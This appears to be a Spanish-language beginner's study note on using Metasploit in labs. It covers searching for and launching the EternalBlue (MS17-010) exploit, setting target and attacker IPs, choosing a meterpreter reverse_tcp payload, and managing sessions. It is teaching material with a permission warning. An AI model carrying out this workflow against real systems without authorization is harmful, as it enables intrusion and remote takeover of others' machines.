# Uso Basico de Metasploit

> [!info] Idea principal
> Metasploit es un framework que permite buscar, configurar y ejecutar exploits contra una maquina objetivo de forma organizada.

## Que es Metasploit

Metasploit es una de las herramientas mas usadas en explotacion de vulnerabilidades.

Con Metasploit puedo:

- Buscar exploits por nombre, servicio o CVE.
- Configurar y lanzar exploits.
- Usar payloads para obtener acceso.
- Manejar sesiones despues de explotar una maquina.
- Usar modulos auxiliares para escaneo y enumeracion.

> [!warning] Importante
> Usar Metasploit solo en maquinas propias, laboratorios o entornos donde tengas permiso.

## Paso 1: Iniciar Metasploit

Para abrir la consola de Metasploit:

```bash
msfconsole
```

> [!tip] Consejo
> La primera vez puede tardar un poco en cargar. Es normal.

## Paso 2: Buscar un Exploit

Para buscar modulos uso el comando `search`.

```text
search eternalblue
```

Tambien puedo buscar por CVE:

```text
search CVE-2017-0143
```

### Que hace search

`search` muestra una lista de modulos relacionados con el termino buscado.

Ejemplo de salida:

```text
#  Name                                      Rank     Description
0  exploit/windows/smb/ms17_010_eternalblue  average  MS17-010 EternalBlue
```

De esa lista me interesa sobre todo:

- El numero (`#`) para seleccionar el modulo.
- El `Name` o ruta del modulo.
- El `Rank`, que indica la fiabilidad del exploit.

## Paso 3: Seleccionar el Exploit

Para seleccionar un modulo uso `use`.

Puedo usar el numero que aparece en la busqueda:

```text
use 0
```

O la ruta completa del modulo:

```text
use exploit/windows/smb/ms17_010_eternalblue
```

## Paso 4: Ver los Parametros

Para ver que parametros necesita el exploit uso `show options`.

```text
show options
```

Esto muestra una tabla con los parametros, si son obligatorios y su valor actual.

### Parametros mas Importantes

- `RHOSTS`: IP de la maquina victima que quiero explotar.
- `RPORT`: puerto de la maquina victima.
- `LHOST`: IP de mi maquina atacante.
- `LPORT`: puerto de mi maquina atacante, donde recibire la conexion.

> [!note] Como recordarlo
> La `R` es de *remote* (la victima) y la `L` es de *local* (mi maquina).

## Paso 5: Configurar los Parametros

Para configurar un parametro uso `set`.

```text
set RHOSTS 192.168.1.28
```

Otros ejemplos:

```text
set RPORT 445
set LHOST 192.168.1.10
set LPORT 4444
```

> [!tip] Ver la IP de mi maquina
> Si no recuerdo mi IP para el `LHOST`, puedo verla con `ifconfig` o `ip a`.

## Paso 6: Ejecutar el Exploit

Cuando todo esta configurado, lanzo el exploit con `run` o `exploit`.

```text
run
```

O tambien:

```text
exploit
```

Ambos comandos hacen lo mismo.

## Elegir el Payload

Muchos exploits permiten elegir un payload, que es el codigo que se ejecuta despues de explotar la vulnerabilidad.

Para ver los payloads disponibles:

```text
show payloads
```

Para seleccionar uno:

```text
set payload windows/x64/meterpreter/reverse_tcp
```

> [!info] Meterpreter
> `meterpreter` es un payload muy potente que da una sesion avanzada con muchas funciones utiles.

## Trabajar con Sesiones

Si el exploit tiene exito, suele abrirse una sesion.

Para ver las sesiones activas:

```text
sessions
```

Para entrar en una sesion concreta:

```text
sessions -i 1
```

## Comandos Utiles dentro de Metasploit

- `search`: buscar modulos.
- `use`: seleccionar un modulo.
- `show options`: ver parametros del modulo.
- `show payloads`: ver payloads disponibles.
- `set`: configurar un parametro.
- `run` o `exploit`: ejecutar el modulo.
- `sessions`: ver o gestionar sesiones.
- `back`: salir del modulo actual.
- `info`: ver informacion detallada del modulo.

## Flujo Resumido

> [!example] Pasos tipicos
> 1. Abrir Metasploit con `msfconsole`.
> 2. Buscar el exploit con `search`.
> 3. Seleccionarlo con `use`.
> 4. Ver parametros con `show options`.
> 5. Configurar con `set`.
> 6. Ejecutar con `run` o `exploit`.
> 7. Gestionar la sesion obtenida.
